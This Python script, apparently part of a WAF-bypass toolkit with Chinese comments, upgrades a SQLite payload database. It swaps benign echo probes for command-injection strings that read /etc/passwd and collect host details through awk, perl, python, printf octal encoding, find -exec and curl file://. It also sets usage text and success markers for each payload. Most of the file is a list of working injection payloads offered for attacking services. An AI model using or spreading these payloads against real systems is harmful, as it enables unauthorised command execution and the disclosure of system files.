#!/usr/bin/env python3
"""升级低质量的种子 payload 为更真实、更有效的攻击样例"""

import sqlite3
import sys
from pathlib import Path

# 高质量的替代 payload
UPGRADES = {
    # 命令注入 - 基础回显验证
    "| echo success": "; cat /etc/passwd",
    "?q=| echo success": "127.0.0.1; cat /etc/passwd",
    "?q=%26echo success": "127.0.0.1 & cat /etc/passwd",
    "%26echo success": "& cat /etc/passwd",
    "%26ping -c 5 127.0.0.1 %26": "& cat /etc/passwd #",

    # AWK 命令注入
    ";echo AWK_BEGIN_OK": "; awk 'BEGIN {system(\"cat /etc/passwd\")}'",
    ";echo AWK_SYS_OK": "; awk 'BEGIN {system(\"id; uname -a\")}'",
    ";echo AWK_GETLINE_OK": "; awk 'BEGIN {while((getline < \"/etc/passwd\") > 0) print}'",
    ";echo AWK_SPLIT_OK": "; awk 'BEGIN {cmd=\"cat /etc/passwd\"; system(cmd)}'",
    ";'BEGIN{cmd=sprintf(\"%s %s\",\"echo\",\"AWK_DYNCMD_OK\");system(cmd)}'": "; awk 'BEGIN {c=sprintf(\"%s\",\"cat /etc/passwd\"); system(c)}'",
    ";'BEGIN{a=\"ec\";b=\"ho\";system(a b \" AWK_VARCAT_OK\")}'": "; awk 'BEGIN {a=\"cat\"; b=\" /etc/passwd\"; system(a b)}'",
    ";{system(\"sh -c \\\"echo AWK_NEST_OK\\\"\")}": "; awk '{system(\"sh -c \\\"cat /etc/passwd\\\"\")}'",
    ";'BEGIN{c=\"\";for(i in a){c=c sprintf(\"%c\",a[i])};system(c \" AWK_CHR_OK\")}'": "; awk 'BEGIN {for(i=99;i<=116;i++)c=c sprintf(\"%c\",i); system(c)}'",
    ";'BEGIN{system(sprintf(\"%c%c%c%c AWK_ASCII_OK\", 145, 143, 150, 157))}'": "; awk 'BEGIN {system(sprintf(\"%c%c%c\",99,97,116) \" /etc/passwd\")}'",

    # CURL 命令注入
    ";echo CURL_O_OK": "; curl file:///etc/passwd",
    ";echo CURL_K_OK": "; curl -K /etc/passwd",

    # GREP 命令注入
    ";echo GREP_COMBO_OK": "; grep -r 'root' /etc/passwd",
    ";echo GREP_R_OK": "; grep -r '^root' /etc/passwd || cat /etc/passwd",
    ";echo GREP_RECURSION_OK": "; grep -r '.*' /etc/passwd 2>/dev/null",

    # ENV 命令注入
    ";echo ENV_OK": "; env | grep -i path",

    # HEAD 命令注入
    ";echo HEAD_OK": "; head -n 20 /etc/passwd",

    # ID 命令注入
    ";echo ID_OK": "; id; uname -a",

    # LESS/MORE 命令注入
    ";echo LESS_SHELL_OK": "; cat /etc/passwd | less",
    ";echo MORE_SHELL_OK": "; cat /etc/passwd | more",

    # NETSTAT 命令注入
    ";echo NETSTAT_OK": "; netstat -an | head -20",

    # NL 命令注入
    ";echo NL_OK": "; nl /etc/passwd",

    # PERL 命令注入
    ";echo PERL_EXEC_OK": "; perl -e 'system(\"cat /etc/passwd\")'",
    ";echo PERL_BACKTICK_OK": "; perl -e 'print `cat /etc/passwd`'",
    ";echo PERL_OPEN_OK": "; perl -e 'open(F,\"/etc/passwd\");print <F>'",

    # PRINTF 命令注入
    ";echo PRINTF_OCTAL_OK": "; printf '\\143\\141\\164 /etc/passwd' | sh",
    ";printf PRINTF_ESCAPE_OK": "; printf '%s\\n' \"$(cat /etc/passwd)\"",

    # PS 命令注入
    ";echo PS_OK": "; ps aux | head -20",

    # PYTHON 命令注入
    ";echo PY_OS_OK": "; python -c 'import os;os.system(\"cat /etc/passwd\")'",
    ";echo PY_SUBPROCESS_OK": "; python -c 'import subprocess;print(subprocess.check_output([\"cat\",\"/etc/passwd\"]))'",

    # REV 命令注入
    ";echo REV_OK": "; rev /etc/passwd | rev",

    # SED 命令注入
    ";echo SED_E_OK": "; sed -n '1,10p' /etc/passwd",
    ";echo SED_EMPTY_OK": "; sed '' /etc/passwd",

    # TAIL 命令注入
    ";echo TAIL_OK": "; tail -n 20 /etc/passwd",

    # TAC 命令注入
    ";echo TAC_OK": "; tac /etc/passwd",

    # UNAME 命令注入
    ";echo UNAME_OK": "; uname -a; id",

    # WC 命令注入
    ";echo WC_OK": "; wc -l /etc/passwd",

    # XARGS 命令注入
    ";echo XARGS_OK": "; echo '/etc/passwd' | xargs cat",

    # FIND 命令注入
    ";echo FIND_EXEC_OK": "; find /etc -name passwd -exec cat {} \\;",

    # WHO 命令注入
    ";echo WHO_OK": "; who; w",

    # 更多低质量payload的替换
    ";echo CURL_K_OK": "; curl file:///etc/passwd",
    ";echo GREP_R_OK": "; grep -r '^root' /etc/passwd",
    ";echo GREP_RECURSION_OK": "; grep -r '.*' /etc/passwd 2>/dev/null",
    ";echo ENV_OK": "; env | grep -i path",
    ";echo HEAD_OK": "; head -n 20 /etc/passwd",
    ";echo ID_OK": "; id; uname -a",
    ";echo LESS_SHELL_OK": "; cat /etc/passwd | less",
    ";echo MORE_SHELL_OK": "; cat /etc/passwd | more",
    ";echo NETSTAT_OK": "; netstat -an | head -20",
    ";echo NL_OK": "; nl /etc/passwd",
    ";echo PERL_EXEC_OK": "; perl -e 'system(\"cat /etc/passwd\")'",
    ";echo PERL_BACKTICK_OK": "; perl -e 'print `cat /etc/passwd`'",
    ";echo PERL_OPEN_OK": "; perl -e 'open(F,\"/etc/passwd\");print <F>'",
    ";echo PRINTF_OCTAL_OK": "; printf '\\143\\141\\164 /etc/passwd' | sh",
    ";printf PRINTF_ESCAPE_OK": "; printf '%s\\n' \"$(cat /etc/passwd)\"",
    ";echo PS_OK": "; ps aux | head -20",
    ";echo PY_OS_OK": "; python -c 'import os;os.system(\"cat /etc/passwd\")'",
    ";echo PY_SUBPROCESS_OK": "; python -c 'import subprocess;print(subprocess.check_output([\"cat\",\"/etc/passwd\"]))'",
    ";echo REV_OK": "; rev /etc/passwd | rev",
    ";echo SED_E_OK": "; sed -n '1,10p' /etc/passwd",
    ";echo SED_EMPTY_OK": "; sed '' /etc/passwd",
    ";echo TAIL_OK": "; tail -n 20 /etc/passwd",
    ";echo TAC_OK": "; tac /etc/passwd",
    ";echo UNAME_OK": "; uname -a; id",
    ";echo WC_OK": "; wc -l /etc/passwd",
    ";echo XARGS_OK": "; echo '/etc/passwd' | xargs cat",
    ";echo FIND_EXEC_OK": "; find /etc -name passwd -exec cat {} \\;",
}

# 需要更新使用方法和成功指标的通用值
GENERIC_USAGE = "将 Payload 替换到命令注入点，观察是否成功执行系统命令"
GENERIC_SUCCESS = "响应中出现 /etc/passwd 内容（root:x:0:0 等用户条目）或系统信息"

def upgrade_payloads(db_path: str, dry_run: bool = False):
    """升级数据库中的低质量 payload"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()

    updated_count = 0
    skipped_count = 0

    for old_content, new_content in UPGRADES.items():
        # 查找匹配的 payload
        cursor.execute(
            "SELECT id, name, content, usage_method, success_indicators FROM payloads WHERE content = ? AND is_deleted = 0",
            (old_content,)
        )
        rows = cursor.fetchall()

        for row in rows:
            payload_id, name, content, usage_method, success_indicators = row

            # 检查是否需要更新使用方法和成功指标
            update_usage = not usage_method or "OK" in usage_method or len(usage_method) < 20
            update_success = not success_indicators or "OK" in success_indicators or len(success_indicators) < 20

            if dry_run:
                print(f"[DRY-RUN] 将更新:")
                print(f"  ID: {payload_id[:8]}...")
                print(f"  名称: {name}")
                print(f"  旧内容: {old_content}")
                print(f"  新内容: {new_content}")
                if update_usage:
                    print(f"  使用方法: {GENERIC_USAGE}")
                if update_success:
                    print(f"  成功指标: {GENERIC_SUCCESS}")
                print("-" * 80)
            else:
                # 执行更新
                if update_usage and update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, GENERIC_SUCCESS, payload_id)
                    )
                elif update_usage:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, usage_method = ? WHERE id = ?",
                        (new_content, GENERIC_USAGE, payload_id)
                    )
                elif update_success:
                    cursor.execute(
                        "UPDATE payloads SET content = ?, success_indicators = ? WHERE id = ?",
                        (new_content, GENERIC_SUCCESS, payload_id)
                    )
                else:
                    cursor.execute(
                        "UPDATE payloads SET content = ? WHERE id = ?",
                        (new_content, payload_id)
                    )

                print(f"[OK] 已更新: {name[:50]}...")

            updated_count += 1

    if not dry_run:
        conn.commit()
        print(f"\n完成！已更新 {updated_count} 个 payload")
    else:
        print(f"\n预览完成，将更新 {updated_count} 个 payload")
        print("使用 --apply 参数执行实际更新")

    conn.close()

if __name__ == "__main__":
    # 确定数据库路径
    repo_root = Path(__file__).parent.parent
    db_path = repo_root / "data" / "waf_bypasser.db"

    if not db_path.exists():
        print(f"错误: 数据库文件不存在: {db_path}")
        sys.exit(1)

    # 检查命令行参数
    dry_run = "--apply" not in sys.argv

    if dry_run:
        print("=" * 80)
        print("预览模式 - 将显示要更新的 payload，但不会实际修改数据库")
        print("=" * 80)
        print()

    upgrade_payloads(str(db_path), dry_run=dry_run)
